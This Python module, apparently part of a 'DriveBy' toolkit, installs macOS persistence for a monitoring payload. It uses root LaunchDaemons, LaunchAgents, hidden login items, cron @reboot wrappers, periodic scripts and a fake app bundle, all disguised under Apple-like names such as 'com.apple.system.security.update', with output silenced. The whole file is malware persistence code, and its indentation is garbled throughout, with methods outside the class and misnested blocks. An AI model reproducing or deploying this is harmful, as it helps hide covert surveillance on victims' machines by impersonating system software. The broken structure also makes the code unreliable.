#!/usr/bin/env python3
"""
macOS Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart
"""

import os
import sys
import subprocess
import tempfile
import shutil
import plistlib
from pathlib import Path

class MacOSPersistence:
    def __init__(self):
        self.script_path = Path(__file__).parent.parent / "payloads" / "linux_monitor.py" # Same as Linux
        self.service_name = "com.apple.system.security.update"

    def create_launchd_daemon(self):
        """Create LaunchDaemon for system-wide persistence"""
        try:
            plist_content = {
            'Label': self.service_name,
            'ProgramArguments': ['/usr/bin/python3', str(self.script_path)],
            'RunAtLoad': True,
            'KeepAlive': True,
            'StandardOutPath': '/dev/null',
            'StandardErrorPath': '/dev/null',
            'UserName': 'root',
            'GroupName': 'wheel'
            }

            plist_path = f"/Library/LaunchDaemons/{self.service_name}.plist"

            # Write plist file
            with open(plist_path, 'wb') as f:
                plistlib.dump(plist_content, f)

                # Set proper permissions
                os.chmod(plist_path, 0o644)
                os.chown(plist_path, 0, 0) # root:wheel

                # Load the daemon
                subprocess.run(['launchctl', 'load', plist_path], check=True)

                print(" LaunchDaemon persistence created")
                return True

        except subprocess.CalledProcessError as e:
                print(f" LaunchDaemon failed: {e}")
                return False
        except Exception as e:
                print(f" LaunchDaemon persistence failed: {e}")
                return False

def create_launchd_agent(self):
    """Create LaunchAgent for user-level persistence"""
    try:
        plist_content = {
        'Label': f"{self.service_name}.agent",
        'ProgramArguments': ['/usr/bin/python3', str(self.script_path)],
        'RunAtLoad': True,
        'KeepAlive': True,
        'StandardOutPath': '/dev/null',
        'StandardErrorPath': '/dev/null'
        }

        # User LaunchAgents directory
        agents_dir = Path.home() / "Library" / "LaunchAgents"
        agents_dir.mkdir(parents=True, exist_ok=True)

        plist_path = agents_dir / f"{self.service_name}.agent.plist"

        # Write plist file
        with open(plist_path, 'wb') as f:
            plistlib.dump(plist_content, f)

            # Load the agent
            subprocess.run(['launchctl', 'load', str(plist_path)], check=True)

            print(" LaunchAgent persistence created")
            return True

    except Exception as e:
            print(f" LaunchAgent persistence failed: {e}")
            return False

def create_login_items_persistence(self):
    """Create Login Items persistence"""
    try:
        # Create wrapper app bundle
        app_bundle = self.create_app_bundle()

        if app_bundle:
            # Add to login items using osascript
            applescript = f'''
            tell application "System Events"
            make login item at end with properties {{path:"{app_bundle}", hidden:true}}
            end tell
            '''

            result = subprocess.run(['osascript', '-e', applescript],
            capture_output=True, text=True)

            if result.returncode == 0:
                print(" Login Items persistence created")
                return True
            else:
                print(f" Login Items failed: {result.stderr}")
                return False

                return False

    except Exception as e:
                print(f" Login Items persistence failed: {e}")
                return False

def create_cron_persistence(self):
    """Create cron job for persistence"""
    try:
        # Create wrapper script
        wrapper_script = self.create_cron_wrapper()

        # Add to crontab
        cron_entry = f"@reboot {wrapper_script}\n"

        # Get current crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
        except:
            current_cron = ""

            # Add our entry if not already present
            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry

                # Write new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)

                if process.returncode == 0:
                    print(" Cron persistence created")
                    return True
                else:
                    print(" Cron persistence already exists")
                    return True

        except Exception as e:
                    print(f" Cron persistence failed: {e}")
                    return False

def create_periodic_script(self):
    """Create periodic script persistence"""
    try:
        # Create script in /etc/periodic/daily
        script_content = f'''#!/bin/bash
        # System Security Update
        cd "{Path(__file__).parent.parent}"
        nohup /usr/bin/python3 "{self.script_path}" > /dev/null 2>&1 &
        '''

        script_path = "/etc/periodic/daily/999.system-security"

        with open(script_path, 'w') as f:
            f.write(script_content)

            # Make executable
            os.chmod(script_path, 0o755)

            print(" Periodic script persistence created")
            return True

    except Exception as e:
            print(f" Periodic script persistence failed: {e}")
            return False

def create_app_bundle(self):
    """Create macOS app bundle for persistence"""
    try:
        # Create app bundle structure
        app_name = "SystemSecurityUpdate.app"
        app_path = Path("/Applications") / app_name

        # Create directories
        contents_dir = app_path / "Contents"
        macos_dir = contents_dir / "MacOS"
        resources_dir = contents_dir / "Resources"

        for directory in [contents_dir, macos_dir, resources_dir]:
            directory.mkdir(parents=True, exist_ok=True)

            # Create Info.plist
            info_plist = {
            'CFBundleExecutable': 'SystemSecurityUpdate',
            'CFBundleIdentifier': 'com.apple.system.security.update',
            'CFBundleName': 'System Security Update',
            'CFBundleVersion': '1.0',
            'CFBundleShortVersionString': '1.0',
            'LSUIElement': True, # Hide from dock
            'LSBackgroundOnly': True # Background only
            }

            with open(contents_dir / "Info.plist", 'wb') as f:
                plistlib.dump(info_plist, f)

                # Create executable script
                executable_content = f'''#!/bin/bash
                cd "{Path(__file__).parent.parent}"
                exec /usr/bin/python3 "{self.script_path}"
                '''

                executable_path = macos_dir / "SystemSecurityUpdate"
                with open(executable_path, 'w') as f:
                    f.write(executable_content)

                    # Make executable
                    os.chmod(executable_path, 0o755)

                    print(f" App bundle created: {app_path}")
                    return str(app_path)

    except Exception as e:
                    print(f" App bundle creation failed: {e}")
                    return None

def create_cron_wrapper(self):
    """Create cron wrapper script"""
    wrapper_content = f'''#!/bin/bash
    cd "{Path(__file__).parent.parent}"

    while true; do
    /usr/bin/python3 "{self.script_path}" > /dev/null 2>&1
    sleep 30
    done
    '''

    wrapper_path = "/tmp/system_security_wrapper.sh"
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)

        os.chmod(wrapper_path, 0o755)
        return wrapper_path

def install_all_persistence(self):
    """Install all persistence mechanisms"""
    results = []

    print(" Installing macOS persistence mechanisms...")

    # Try LaunchDaemon (requires root)
    if os.geteuid() == 0:
        results.append(self.create_launchd_daemon())
    else:
        print(" LaunchDaemon requires root privileges")

        # Try LaunchAgent (user level)
        results.append(self.create_launchd_agent())

        # Try Login Items
        results.append(self.create_login_items_persistence())

        # Try cron persistence
        if shutil.which('crontab'):
            results.append(self.create_cron_persistence())

            # Try periodic script (requires root)
            if os.geteuid() == 0:
                results.append(self.create_periodic_script())

                successful = sum(results)
                print(f" macOS persistence: {successful}/{len(results)} methods installed")

                return successful > 0

def remove_persistence(self):
    """Remove all persistence mechanisms"""
    try:
        # Remove LaunchDaemon
        try:
            daemon_plist = f"/Library/LaunchDaemons/{self.service_name}.plist"
            subprocess.run(['launchctl', 'unload', daemon_plist], capture_output=True)
            os.remove(daemon_plist)
        except:
            pass

            # Remove LaunchAgent
            try:
                agent_plist = Path.home() / "Library" / "LaunchAgents" / f"{self.service_name}.agent.plist"
                subprocess.run(['launchctl', 'unload', str(agent_plist)], capture_output=True)
                if agent_plist.exists():
                    agent_plist.unlink()
            except:
                    pass

                    # Remove Login Items
                    try:
                        applescript = '''
                            tell application "System Events"
                            delete login item "SystemSecurityUpdate"
                            end tell
                        '''
                        subprocess.run(['osascript', '-e', applescript], capture_output=True)
                    except:
                        pass

                        # Remove app bundle
                        try:
                            app_path = Path("/Applications") / "SystemSecurityUpdate.app"
                            if app_path.exists():
                                shutil.rmtree(app_path)
                        except:
                                pass

                                # Remove cron entry
                                try:
                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                                    if result.returncode == 0:
                                        lines = result.stdout.split('\n')
                                        filtered_lines = [line for line in lines if 'system_security_wrapper' not in line]
                                        new_cron = '\n'.join(filtered_lines)

                                        process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                                        process.communicate(input=new_cron)
                                except:
                                        pass

                                        # Remove periodic script
                                        try:
                                            os.remove("/etc/periodic/daily/999.system-security")
                                        except:
                                            pass

                                            # Remove wrapper script
                                            try:
                                                os.remove("/tmp/system_security_wrapper.sh")
                                            except:
                                                pass

                                                print(" macOS persistence removed")
                                                return True

                                            except Exception as e:
                                                print(f" Error removing persistence: {e}")
                                                return False

                                                if __name__ == "__main__":
                                                    persistence = MacOSPersistence()

                                                    if len(sys.argv) > 1 and sys.argv[1] == "remove":
                                                        persistence.remove_persistence()
                                                    else:
                                                        persistence.install_all_persistence()
